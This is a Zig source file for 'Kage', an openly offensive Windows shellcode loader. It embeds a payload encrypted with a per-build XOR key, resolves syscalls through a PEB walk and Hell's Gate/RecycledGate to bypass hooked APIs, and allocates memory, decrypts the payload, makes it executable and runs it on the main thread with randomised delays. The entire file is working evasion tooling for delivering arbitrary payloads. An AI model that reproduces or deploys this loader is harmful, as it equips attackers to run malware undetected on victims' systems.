// hells gate shellcode loader. self-injection, per-build random xor key, peb walk.
// RecycledGate syscall resolution, direct call on main thread, then park forever.

const std = @import("std");
const windows = std.os.windows;
const nt = @import("nt.zig");
const syscall = @import("syscall.zig");
const build_options = @import("build_options");

const print = std.debug.print;
// 128-bit per-build xor key injected by build.zig via addOptions.
const key_bytes: [16]u8 = @bitCast(build_options.shellcode_key);

var g_sys: syscall.Syscalls = undefined;

// logging helpers.
fn ok(comptime fmt: []const u8, args: anytype) void {
    print("[+] " ++ fmt ++ "\n", args);
}
fn info(comptime fmt: []const u8, args: anytype) void {
    print("[*] " ++ fmt ++ "\n", args);
}
fn err(comptime fmt: []const u8, args: anytype) void {
    print("[-] " ++ fmt ++ "\n", args);
}

// per-build XOR-encrypted payload from build.zig. drop payload.bin in src/.
const shellcode = @embedFile("payload_enc.bin");

fn banner() void {
    print(
        \\ Kage - shellcode loader
        \\ Author: JYenn (SISTA)
        \\
    , .{});
}

pub fn main() void {
    banner();

    if (shellcode.len == 0) {
        err("no shellcode embedded, paste your shellcode bytes in main.zig", .{});
        return;
    }

    info("payload  : {d} bytes, {d}-byte xor key (per-build random)", .{ shellcode.len, key_bytes.len });
    info("delivery : self-inject, direct call on main thread + park", .{});

    // resolve syscall SSNs and gadgets via peb walk + RecycledGate.
    g_sys = syscall.Syscalls.resolve() orelse {
        err("failed to resolve syscalls", .{});
        return;
    };
    ok("syscalls resolved via PEB walk + RecycledGate", .{});
    print("    NtAllocateVirtualMemory  ssn={d}\n", .{g_sys.NtAllocateVirtualMemory.number});
    print("    NtProtectVirtualMemory   ssn={d}\n", .{g_sys.NtProtectVirtualMemory.number});
    print("    NtDelayExecution         ssn={d}\n", .{g_sys.NtDelayExecution.number});

    const current_process: windows.HANDLE = nt.NtCurrentProcess;
    var base_addr: ?*anyopaque = null;
    var size: windows.SIZE_T = shellcode.len;

    // allocate RW memory.
    const status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
        g_sys.NtAllocateVirtualMemory.number,
        &[_]usize{
            @intFromPtr(current_process), @intFromPtr(&base_addr),        0,
            @intFromPtr(&size),           nt.MEM_COMMIT | nt.MEM_RESERVE, nt.PAGE_READWRITE,
        },
        6,
    ))));
    if (!nt.NT_SUCCESS(status)) {
        err("NtAllocateVirtualMemory failed: 0x{X}", .{@intFromEnum(status)});
        return;
    }
    ok("allocated {d} bytes at 0x{X}", .{ size, @intFromPtr(base_addr) });
    jitter(10, 50);

    // copy encrypted shellcode and decrypt in-place.
    const buffer: [*]u8 = @ptrCast(base_addr);
    @memcpy(buffer[0..shellcode.len], shellcode);
    for (buffer[0..shellcode.len], 0..) |*b, i| b.* ^= key_bytes[i % key_bytes.len];
    ok("decrypted in-place ({d} bytes)", .{shellcode.len});
    jitter(10, 30);

    // rw → rx.
    var old_protect: windows.ULONG = 0;
    const prot_status: windows.NTSTATUS = @enumFromInt(@as(u32, @truncate(syscall.syscall_dispatch(
        g_sys.NtProtectVirtualMemory.number,
        &[_]usize{
            @intFromPtr(current_process), @intFromPtr(&base_addr),
            @intFromPtr(&size),           nt.PAGE_EXECUTE_READ,
            @intFromPtr(&old_protect),
        },
        5,
    ))));
    if (!nt.NT_SUCCESS(prot_status)) {
        err("NtProtectVirtualMemory failed: 0x{X} — running from RW memory", .{@intFromEnum(prot_status)});
    } else {
        ok("memory protected to RX", .{});
    }
    jitter(5, 15);

    // direct call on the main thread. if the payload starts its own threads and
    // returns (Donut does), park this thread forever so the process stays alive.
    // alertable=0 — no APC can ever be delivered on this thread again.
    info("executing on main thread (no new thread, no APC)", .{});
    const entry: *const fn () callconv(.c) void = @ptrCast(base_addr);
    entry();

    info("payload returned — parking thread (NtDelayExecution, alertable=0)", .{});
    const day: i64 = -@as(i64, 24 * 60 * 60 * 10_000_000);
    while (true) {
        _ = syscall.syscall_dispatch(g_sys.NtDelayExecution.number, &[_]usize{ 0, @intFromPtr(&day) }, 2);
    }
}

// pseudorandom sleep between stages. not crypto, just noise.
fn jitter(min_ms: u64, max_ms: u64) void {
    const delay: i64 = -@as(i64, @intCast(min_ms * 10000 + (@as(u64, @intFromPtr(&min_ms)) % ((max_ms - min_ms + 1) * 10000))));
    _ = syscall.syscall_dispatch(
        g_sys.NtDelayExecution.number,
        &[_]usize{ 0, @intFromPtr(&delay) },
        2,
    );
}
